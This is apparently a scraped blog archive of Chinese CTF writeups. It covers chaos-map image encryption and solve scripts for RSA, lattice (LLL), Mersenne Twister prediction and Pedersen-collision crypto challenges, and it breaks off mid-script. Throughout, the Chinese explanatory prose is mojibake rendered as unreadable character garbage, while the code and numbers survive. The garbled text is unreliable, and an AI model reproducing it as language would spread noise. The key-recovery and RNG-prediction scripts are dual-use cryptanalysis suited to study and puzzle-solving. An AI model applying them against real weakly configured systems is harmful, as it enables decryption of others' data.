è¿‘4æ—¶ï¼Œè¿­ä»£ç”Ÿæˆçš„å€¼æ˜¯å‡ºäºä¸€ç§ä¼ªéšæœºåˆ†å¸ƒçš„çŠ¶æ€ï¼Œè€Œåœ¨å…¶ä»–å–å€¼æ—¶ï¼Œåœ¨ç»è¿‡ä¸€å®šæ¬¡æ•°çš„è¿­ä»£ä¹‹åï¼Œç”Ÿæˆçš„å€¼å°†æ”¶æ•›åˆ°ä¸€ä¸ªç‰¹å®šçš„æ•°å€¼ï¼Œè¿™å¯¹äºæˆ‘ä»¬æ¥è¯´æ˜¯ä¸å¯æ¥å—çš„ã€‚\nä¸‹å›¾ä¸­æè¿°äº†X0å€¼ä¸€å®šæ—¶ï¼Œå¯¹äºä¸åŒçš„Î¼çš„å–å€¼ï¼Œè¿­ä»£å¯èƒ½å¾—åˆ°çš„å€¼ï¼š\nå›¾ä¸­çš„ç‚¹å³è¡¨æ˜äº†æ‰€æœ‰å¯èƒ½çš„Xå–å€¼èŒƒå›´ã€‚ä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œåœ¨Î¼è¶Šæ¥è¿‘4çš„åœ°æ–¹ï¼ŒXå–å€¼èŒƒå›´è¶Šæ˜¯æ¥è¿‘å¹³å‡åˆ†å¸ƒåœ¨æ•´ä¸ª0åˆ°1çš„åŒºåŸŸï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€‰å–çš„Logisticæ§åˆ¶å‚æ•°åº”è¯¥è¶Šæ¥è¿‘4è¶Šå¥½ã€‚å½“3.5699456\u0026hellip;\u0026lt;Î¼â‰¤43.5699456\u0026hellip;\u0026lt;Î¼â‰¤4æ—¶ï¼Œæ˜ å°„è¿›å…¥æ··æ²Œ(chaos)åŒºåŸŸã€‚Logisticæ˜ å°„åˆ†å²”å›¾åƒå¦‚å›¾1æ‰€ç¤ºã€‚ç°åœ¨è¿™ç±»æ¨¡å‹æ˜¯äººä»¬æœ€å¸¸è§çš„ï¼Œæ›´æ˜¯å¹¿ä¸ºä½¿ç”¨çš„ã€‚\nåœ¨Î¼çš„å€¼ç¡®å®šä¹‹åï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹åˆå§‹å€¼X0å¯¹æ•´ä¸ªç³»ç»Ÿçš„å½±å“ã€‚åˆšæ‰ä¹Ÿè¯´è¿‡äº†ï¼Œæ··æ²Œç³»ç»Ÿåœ¨åˆå§‹å€¼å‘ç”Ÿå¾ˆå°å˜åŒ–æ—¶ï¼Œå¾—åˆ°çš„ç»“æ„å°±ä¼šå¤§ç›¸å¾„åº­ï¼Œåœ¨Logisticæ··æ²Œæ˜ å°„ä¸­ä¹Ÿæ˜¯å¦‚æ­¤ã€‚\nä¸€ç§åƒç´ ç°åº¦å€¼æ›¿ä»£è®¾è®¡å›¾åƒåŠ å¯† # è®¾å›¾åƒ$(i,j)$å¤„çš„ç°åº¦å€¼ä¸º $I(i,j)$,$I\u0026rsquo;(i,j)$è¡¨ç¤ºæ›¿æ¢åçš„å€¼\næœ¬æ–‡ä¸­ï¼Œåƒç´ å€¼çš„æ›¿ä»£å˜æ¢æ˜¯åœ¨ç©ºåŸŸä¸­è¿›è¡Œçš„ï¼Œä¸€èˆ¬ï¼Œè®¾è®¡äº†ä¸¤ç§æ€è·¯ç”¨äºå®ç°æ··æ²Œåºåˆ—ä¸åƒç´ å€¼çš„æ›¿æ¢æ“ä½œã€‚\n$Iâ€²(i,j)=((r1(i,j)âŠ•I(i,j)âŠ•r2(i,j)+Lâˆ’r3(i,j)));mod;L);mod;256$\n$L$è¡¨ç¤ºå›¾åƒçš„é¢œè‰²æ·±åº¦\n$r1,r2,r3$è¡¨ç¤ºçš„æ˜¯æ··æ²Œåºåˆ—å€¼ï¼Œæ›¿æ¢å˜æ¢çš„å¯†é’¥ç”±$r1,r2,r3$å¯¹åº”çš„æ··æ²Œç³»ç»Ÿæä¾›ï¼Œå˜æ¢å¯å¤šæ¬¡è¿›è¡Œï¼Œå¦‚æ­¤åŠ å¯†æ•ˆæœæ›´å¥½ã€‚è®¾é‡å¤æ¬¡æ•°ä¸º n ï¼Œä¸æ··æ²Œæ¨¡å‹çš„åˆå€¼å’Œå‚æ•°å…±åŒä½œä¸ºè¿™ä¸€éƒ¨åˆ†çš„å¯†é’¥ï¼Œå¢å¤§äº†å¯†é’¥çš„ç©ºé—´\nè‹¥å›¾åƒå¾ˆå¤§æ—¶ï¼Œé€šè¿‡ä¸Šå¼èƒ½å¤Ÿçœ‹å‡ºr1,r2,r3æ¨¡ç‰ˆçŸ©é˜µéœ€è¦éšä¹‹å¢å¤§ï¼Œå¦‚æ­¤å°±å¤§å¤§å‡å°äº†åŠ å¯†æ•ˆç‡ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ†å—å¤„ç†çš„æ–¹å¼å¯¹å›¾åƒè¿›è¡ŒåŠ å¯†ï¼ŒåŠ å¯†æ•ˆç‡æ˜æ˜¾æé«˜ã€‚å›¾2æ˜¯åŸå§‹å›¾åƒå’ŒåŠ å¯†åçš„å›¾åƒ:\næ··æ²Œç†è®ºChaos theory # Chaos theory is a branch of mathematics focusing on the study of chaos â€” dynamical systems whose apparently random states of disorder and irregularities are actually governed by underlying patterns and deterministic laws that are highly sensitive to initial conditions\nå¤§æ„æ˜¯æ··æ²Œç³»ç»Ÿæ˜¯æ•°å­¦çš„ä¸€ä¸ªåˆ†æ”¯\nè¿™é‡Œåˆ©ç”¨ä¸€äº›è‡ªç„¶ä¸­å¯¹åˆå§‹æ¡ä»¶åŠå…¶æ•æ„Ÿçš„æ¨¡å‹æ¥è¾“å‡ºåŠ å¯†åºåˆ—ï¼Ÿ\n","date":"31 July 2021","permalink":"/achieve/2019to2021/chaostc/","section":"archive","summary":"","title":"Chaos encrypt system"},{"content":"\rç™«ç–¯æå®¢ # é˜¿çŒ«é˜¿ç‹—ä»¬æ‹¼ä¸Šçˆ¹å¦ˆè¿½èµ¶evoa\næœ€åä¸€åˆ†é’Ÿå¤§å®¶å‚ç›´ä¸Šåˆ†çš„æ ·å­çœŸçš„å¾ˆé“ä»”\nMedicalImage # æ··æ²ŒåŠ å¯†ç³»ç»Ÿï¼Œä¸€ç§é’ˆå¯¹å›¾åƒçš„åŠ å¯†ç³»ç»Ÿ\nä¸»è¦æŒ‰ç…§Logistic æ¨¡å‹æ¥æ„é€ è¿­ä»£å‡½æ•°\n$\\mu$é€‰å–æœ€å¤§å€¼4\ndef f1(x): # It is based on logistic map in chaotic systems # The parameter r takes the largest legal value assert(x\u0026gt;=0) assert(x\u0026lt;=1) r = 4 return x*r*(1-x) ç„¶åæŠŠencryptçš„é€†ç®—æ³•å†™å‡ºæ¥å°±è¡Œäº†\np0 = random.randint(100,104) c0 = random.randint(200,204) è¿™ä¸¤ä¸ªéšæœºæ•°éšä¾¿å–ä¸€ä¸ªèŒƒå›´å†…çš„\nå¯¹è§£å¯†æ²¡æœ‰å½±å“\nexp # from PIL import Image from icecream import * from decimal import * import numpy as np import random getcontext().prec = 20 def f1(x): assert(x\u0026gt;=0) assert(x\u0026lt;=1) r = 4 return x*r*(1-x) def f2(x): assert(x\u0026gt;=0) assert(x\u0026lt;=1) r = 4 return x*r*(1-x) def f3(x): r = 4 return x*r*(1-x) # get data1 im = Image.open(\u0026#39;flag_enc.bmp\u0026#39;) size = im.size pixels = im.load() w,h = size[0],size[1] pic=[[0 for _ in range(w)] for __ in range(h)] for i in range(w): for j in range(h): pic[j][i]=pixels[i,j] r1 = Decimal(\u0026#39;0.478706063089473894123\u0026#39;) r2 = Decimal(\u0026#39;0.613494245341234672318\u0026#39;) r3 = Decimal(\u0026#39;0.946365754637812381837\u0026#39;) w,h = size for i in range(200): r1 = f1(r1) r2 = f2(r2) r3 = f3(r3) const = 10**14 # å…ˆå¯¹ R3 åºåˆ—æ‰“è¡¨ p0 = 102 c0 = 202 # print(pic[0]) # input() for x in range(w): for y in range(h): k = int(round(const*r3))%256 k = bin(k)[2:].ljust(8,\u0026#39;0\u0026#39;) k = int(k[p0%8:]+k[:p0%8],2) r3 = f3(r3) # print(k) # input() tmp=pic[y][x] p0 = ((tmp^c0^k)-k)%256 c0=tmp pic[y][x]=p0 # ===================== # p0 = pic[y][x] # c0 = k^((k+p0)%256)^c0 # pic[y][x] = c0 # print(pic[0]) XX=[] YY=[] X=[] Y=[] i=0 for x in range(w): for y in range(h): i+=1 x1 = int(round(const*r1))%w y1 = int(round(const*r2))%h XX.append(x1) YY.append(y1) r1 = f1(r1) r2 = f2(r2) i-=1 for x in range(w-1,-1,-1): for y in range(h-1,-1,-1): x1 = XX[i] y1 = YY[i] tmp = pic[y1][x1] pic[y1][x1] = pic[y][x] pic[y][x] = tmp i-=1 # print(i) # print(pic[0]) im = Image.new(\u0026#39;P\u0026#39;, size,\u0026#39;white\u0026#39;) flag = im.load() # print(w,h) # 650 114 for x in range(w): for y in range(h): flag[x,y] = pic[y][x] im.save(\u0026#39;output.bmp\u0026#39;) output.bmp # æ˜æ˜å¾ˆç®€å•çš„ä¸€ä¸ªé¢˜å´æµªè´¹äº†ä¸€ä¸­åˆ\nèšŒåŸ ä½äº†ğŸ˜°ğŸ˜°ğŸ˜°\n","date":"31 July 2021","permalink":"/achieve/ctf/dfjk2021/","section":"archive","summary":"","title":"Writeup for MedicalImage in ç™«ç–¯geekCtf 2021"},{"content":" Refer:Intnet\n2021å¹´ä¸­å›½èƒ½æºç½‘ç»œå®‰å…¨å¤§èµ› # NumberGame # e=65537 (p-1)*(q-1)=15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032 c=13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763 invert(p,q)=63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531 invert(q,p)=61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507 ç»™å‡º $(p-1)(q-1),x=\\text{inv}(p,q),y=\\text{inv}(q,p),e,c$ã€‚\nè¯¦ç»†æ¨å¯¼æ€è·¯å¯å‚è€ƒ HITCON 2019 - Lost Modulus Againã€‚\nè§£é¢˜è„šæœ¬ï¼š\nimport gmpy2 from itertools import product import binascii from Crypto.Util.number import * \u0026#34;\u0026#34;\u0026#34; alpha = p\u0026#39; * q\u0026#39; - l beta = l^2 * [(e * d - 1) / s] + q\u0026#39; * l + p\u0026#39; * l - p\u0026#39; * q\u0026#39; - alpha - l^2 i.e.: beta = l^2 * {[(e * d - 1) / s] - 1} + l * (q\u0026#39; + p\u0026#39;) - alpha - p\u0026#39; * q\u0026#39; if l,s are correct: alpha = k * t beta = k * (p\u0026#39; - l) + t * (q\u0026#39; - l) i.e: \u0026#34;\u0026#34;\u0026#34; def alpha_from_pprime_qprime_l(pprime, qprime, l): return pprime*qprime - l def beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha): temp1 = e*d - 1 assert temp1 % s == 0 temp2 = ((temp1 // s) - 1) * l * l temp3 = temp2 + l * (pprime + qprime) return temp3 - alpha - (pprime*qprime) def k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta): a = pprime - l b = -beta c = alpha * (qprime - l) disc = b * b - 4 * a * c assert gmpy2.is_square(disc) temp = -b + gmpy2.isqrt(disc) assert temp % (2*a) == 0 k = temp // (2*a) assert alpha % k == 0 return k, alpha // k def brute_k_t_l(pprime, qprime, e, d): # l, s = 2, 2 ss = [s for s in range(e - 100000, e + 1000000) if s!=0 and (e*d - 1) % s == 0] for l, s in product(range(1, 5000), ss): #print(f\u0026#39;l = {l}, s = {s}\u0026#39;) try: alpha = alpha_from_pprime_qprime_l(pprime, qprime, l) beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha) k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta) return k, t, l except AssertionError: continue if __name__ == \u0026#34;__main__\u0026#34;: e = 65537 fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032 d = gmpy2.invert(e,fn) pprime = 63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531 qprime = 61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507 k, t, l = brute_k_t_l(pprime, qprime, e, d) lp, lq = qprime + k, pprime + t assert lp % l == 0, lq % l == 0 p, q = lp // l, lq // l assert gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime assert gmpy2.is_prime(p), gmpy2.is_prime(q) N = p*q c = 13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763 flag_decoded = pow(c, d, N) print(long_to_bytes(flag_decoded)) #b\u0026#39;flag{dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm}\u0026#39; FillTheBlank # æ¨å…¬å¼ï¼Ÿ\nfrom Crypto.Util.number import * import gmpy2 import math a = 16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723 b = \u0026#34;**********\u0026#34; d = 1004034638166310792730607806775703553124564601554345421260673 flag=\u0026#34;flag{*************}\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) m = bytes_to_long(flag) z = \u0026#34;**********\u0026#34; rb = gmpy2.invert(b, p) #påº”ä¸ºa rd = gmpy2.invert(d, p) #påº”ä¸ºa x = rb*rd c = (m + z * rb * d % a)%a assert(x==6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478) assert(c == 13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129) assert(log(d)/log(2)\u0026lt;=200) assert(log(z)/log(2)\u0026lt;=1024) æ¨å¯¼ï¼š\nç”± $rb \\equiv b^{-1} \\pmod a$ å’Œ $rd \\equiv d^{-1} \\pmod a$ ï¼Œæœ‰ $rb \\cdot b \\cdot rd \\cdot d = x \\cdot b \\cdot d \\equiv 1 \\pmod a$ã€‚\næ•…æ±‚å‡º $b \\equiv (x \\cdot d)^{-1} \\pmod a$ï¼Œ$rb \\equiv b^{-1} \\pmod a$ã€‚\nåˆ $c = (m+z \\cdot rb \\cdot d) \\bmod a$ï¼Œæ„é€ æ ¼ $L=\\begin{bmatrix} 1 \u0026amp; rb \\cdot d \\ 0 \u0026amp; a \\end{bmatrix}$ï¼Œåˆ©ç”¨LLLç®—æ³•æ±‚è§£ï¼š\na = 16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723 d = 1004034638166310792730607806775703553124564601554345421260673 x = 6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478 c = 13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129 import gmpy2 b = gmpy2.invert(x*d,a) rb = gmpy2.invert(b,a) rd = gmpy2.invert(d,a) h = rb*d%a p = a v1 = vector(ZZ, [1, h]) v2 = vector(ZZ, [0, p]) m = matrix([v1,v2]); f, g = m.LLL()[0] f, g = -f, -g #print(f, g) a = f*c % p % g m = a * inverse_mod(f, g) % g print(bytes.fromhex(hex(m)[2:])) #b\u0026#39;flag{we1c0mE_t0_cr4aK_mE!}\u0026#39; GKCTFxDASCTFåº”æ€¥æŒ‘æˆ˜æ¯ # Random # import random from hashlib import md5 def get_mask(): file = open(\u0026#34;random.txt\u0026#34;,\u0026#34;w\u0026#34;) for i in range(104): file.write(str(random.getrandbits(32))+\u0026#34;\\n\u0026#34;) file.write(str(random.getrandbits(64))+\u0026#34;\\n\u0026#34;) file.write(str(random.getrandbits(96))+\u0026#34;\\n\u0026#34;) file.close() get_mask() flag = md5(str(random.getrandbits(32)).encode()).hexdigest() print(flag) æ ¹æ® random.txt ä¸­104ç»„ random.getrandbits() å‡½æ•°è¾“å‡ºå€¼ï¼Œåˆ©ç”¨é¢„æµ‹å·¥å…· Mersenne Twister Predictor æ¥æ±‚å‡ºä¸‹ä¸€ä¸ªéšæœºæ•°ï¼š\nimport random from mt19937predictor import MT19937Predictor from hashlib import md5 predictor = MT19937Predictor() file = open(\u0026#34;random.txt\u0026#34;,\u0026#34;r\u0026#34;).readlines() c1 = [] c2 = [] c3 = [] for k in range(0,len(file),3): c1 += [int(file[k].strip())] c2 += [int(file[k+1].strip())] c3 += [int(file[k+2].strip())] for k in range(104): predictor.setrandbits(c1[k], 32) predictor.setrandbits(c2[k], 64) predictor.setrandbits(c3[k], 96) print(md5(str(predictor.getrandbits(32)).encode()).hexdigest()) #14c71fec812b754b2061a35a4f6d8421 RSA # Just RSA!\nfrom Crypto.Util.number import * from sympy import nextprime import gmpy2 import random def encode (p1,p2,e): not_hint = (p1 + 1) * (p2 + 1) S = gmpy2.invert(e, not_hint) not_p = S%(p1+1) return not_p flag = b\u0026#39;Neepu{********************}\u0026#39; flag = bytes_to_long(flag) p = getPrime(512) q = getPrime(512) n = p*q e = nextprime(random.randint(1,1000)) d = gmpy2.invert(e, (p-1)*(q-1)) c = pow(flag, e, n) print(c) print(n) m = encode(p, q, e) c1 = pow(m, 7, n) c2 = pow(m+e, 7, n) print(c1) print(c2) \u0026#39;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671\u0026#39; \u0026#39;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543\u0026#39; \u0026#39;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892\u0026#39; \u0026#39;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119\u0026#39; ä¸¤éƒ¨åˆ†ï¼š\nç¬¬ä¸€éƒ¨åˆ† $n=pq,c=\\text{flag}^e \\bmod n$ï¼Œ\nç¬¬äºŒéƒ¨åˆ† $m=\\text{enc}(p,q,e),c_1=m^7 \\bmod n,c_2=(m+e)^7 \\bmod n$ã€‚\nå…ˆè§£ç¬¬äºŒéƒ¨åˆ†ï¼Œåˆ©ç”¨Related Message Attackæ±‚è§£ $m$ï¼Œç”±äº $e$ æœªçŸ¥ä¸” $e\u0026lt;1010$ï¼Œçˆ†ç ´ $e$ æ±‚å‡º $m$ï¼š\nimport binascii def attack(c1, c2, n, e): PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) g1 = (x)^7 - c1 g2 = (x+e)^7 - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0] c1 = 10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892 c2 = 46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119 n = 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543 for e in range(1,1000): m = attack(c1, c2, n, e) try: if pow(m,7,n) == c1: print((e,m)) except: pass #ç»“æœï¼š(71, 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859) #e = 71 #m = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859 åˆ $m=\\text{enc}(p,q,e)$ï¼Œå³ $eS=ed \\equiv 1 \\pmod {(p+1)(q+1)},dp=S \\bmod (p+1)=d \\bmod (p+1)$ï¼Œ\nç”±äº $e \\cdot dp \\equiv e \\cdot d \\equiv 1 \\pmod {(p+1)}$ï¼Œæœ‰ $e \\cdot dp-1=k \\cdot (p+1)$ï¼Œ\næ¯”è¾ƒ $e \\cdot dp$ ä¸ $p$ æ¯”ç‰¹ä½æ•°ç›¸è¿‘ï¼Œæ•… $k$ å€¼ä¸å¤§ï¼Œ\nçˆ†ç ´ $k$ï¼Œå½“åŒæ—¶æ»¡è¶³ $(e \\cdot dp-1) \\bmod k =0$ å’Œ $n \\bmod \\Big(\\cfrac{e \\cdot dp-1}{k}-1\\Big)$ æ—¶ï¼Œ$n$ æˆåŠŸåˆ†è§£ã€‚\nn = 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543 dp = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859 e = 71 c = 78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671 for k in range(1,10000): if (e*dp-1)%k == 0: p = (e*dp-1)//k-1 if n%p == 0: q = n//p print((k,p,q)) æœ€åå¸¸è§„RSAæ±‚å¾—flagã€‚\nçº¢æ˜è°·æ¯æ•°æ®å®‰å…¨å¤§èµ›æŠ€èƒ½åœºæ™¯èµ› # ezCRT # Chinese Remainder Theorem is fantastic\nfrom Crypto.Util.number import * import gmpy2 from random import shuffle flag = b\u0026#34;flag is here\u0026#34; def shuffle_flag(s): str_list = list(s) shuffle(str_list) return \u0026#39;\u0026#39;.join(str_list) nl = [] el = [] count = 0 while count != 5: p = getPrime(512) q = getPrime(512) n = p * q phi = (p - 1) * (q - 1) d = gmpy2.next_prime(bytes_to_long(flag)) e = gmpy2.invert(d, phi) nl.append(n) el.append(int(e)) count += 1 print(nl) print(el) cl = [] flag = shuffle_flag(flag.decode()).encode() for i in range(len(nl)): cl.append(pow(bytes_to_long(flag), el[i], nl[i])) print(cl) äº”ç»„ $n,e$ï¼Œå…±ç§é’¥ $d$ï¼Œç”¨LLLç®—æ³•æ‰“ã€‚å‘ç° $n$ éƒ½å·²å¸®ä»å°åˆ°å¤§æ’å¥½åºï¼Œä¸€æ­¥åˆ°ä½ã€‚\nç”±äº d = gmpy2.next_prime(bytes_to_long(flag))ï¼Œæ±‚å‡º $d$ åå¾€å›éå†æ‹¿åˆ°flagã€‚\n#Sage from gmpy2 import * n = e = c = M=iroot(int(n[4]),int(2))[0] a = [0]*6 a[0] = [M,e[0],e[1],e[2],e[3],e[4]] a[1] = [0,-n[0],0,0,0,0] a[2] = [0,0,-n[1],0,0,0] a[3] = [0,0,0,-n[2],0,0] a[4] = [0,0,0,0,-n[3],0] a[5] = [0,0,0,0,0,-n[4]] Mat = matrix(ZZ,a) Mat_LLL = Mat.LLL() d = abs(Mat_LLL[0][0]) // M for k in range(1500): print(bytes.fromhex(hex(d-k)[2:])) Crypto_System # ä»[CyBRICS 2020 - Too Secure](\rhttp://ctfteam.com/writeup/8/Too Secure)é­”æ”¹çš„PedersenåŠ å¯†ï¼Œç®—æ³•æè¿°ï¼š\nå·²çŸ¥ä¿¡æ¯ $m_1,m_2$å’Œ $m_1$ çš„ $r_1$ï¼Œ$m_1$ é€šè¿‡å› å­ $r_1$ åŠ å¯†å¾—åˆ° $c_1$ï¼Œéœ€è¦æ±‚å‡ºå› å­ $r_2$ï¼Œä½¿å¾— $m_2$ é€šè¿‡ $r_2$ åŠ å¯†å¾—åˆ°çš„ $c_2$ ä¸ $c_1$ ç›¸åŒï¼Œå³äº§ç”Ÿç¢°æ’ã€‚\nå¯¹äºå¾…åŠ å¯†ä¿¡æ¯ $m_1$ï¼Œ$c_1=g^{m_1}h_1^{r_1}$ï¼Œæ³¨æ„åˆ° $h_1=g^{a_1}$ï¼Œæ•… $c_1=g^{m_1+a_1r_1}$ï¼›\nè¦ç¢°æ’ä¿¡æ¯ $m_2$ çš„å› å­ $r_2$ åº”æ»¡è¶³ $c_2=c_1$ï¼Œå³ $m_1+a_1r_1 \\equiv m_2+a_2r_2 \\pmod {\\varphi(p)}$ï¼Œ\nåˆ $q$ ä¸º $g$ çš„é˜¶ï¼Œæ‰€ä»¥æœ‰ $m_1+a_1r_1 \\equiv m_2+a_2r_2 \\pmod q$ï¼Œ\næ•… $r_2 \\equiv (m_1+a_1r_1-m_2) \\pmod q$ï¼Œå³å¯æ±‚å‡º $r_2$ã€‚\nExpï¼š\n#python2 from pwn import * from parse import * from pwnlib.util.iters import bruteforce import string from hashlib import sha256 from Crypto.Util.number import * import hashlib from gmpy2 import gcd,invert def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=\u0026#39;fixed\u0026#39;) p = 12039102490128509125925019010000012423515617235219127649182470182570195018265927223 g = 10729072579307052184848302322451332192456229619044181105063011741516558110216720725 def int2str(data, mode=\u0026#34;big\u0026#34;): if mode == \u0026#34;little\u0026#34;: return sum([ord(data[_]) * 2 ** (8 * _) for _ in range(len(data))]) elif mode == \u0026#34;big\u0026#34;: return sum([ord(data[::-1][_]) * 2 ** (8 * _) for _ in range(len(data))]) def get_parameter(m): x = int2str(m, \u0026#39;little\u0026#39;) y = pow(g, x, p) a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(128, \u0026#34;\\0\u0026#34;)).digest()) b = pow(a, a, p - 1) h = pow(g, b, p) return x, y, h, b def sign(m, r): x, y, h, b = get_parameter(m) s = (y * pow(h, r, p)) % p return s def verify(m, r, s): x, y, h, b = get_parameter(m) if s == ((y * pow(h, r, p)) % p): return True else: return False 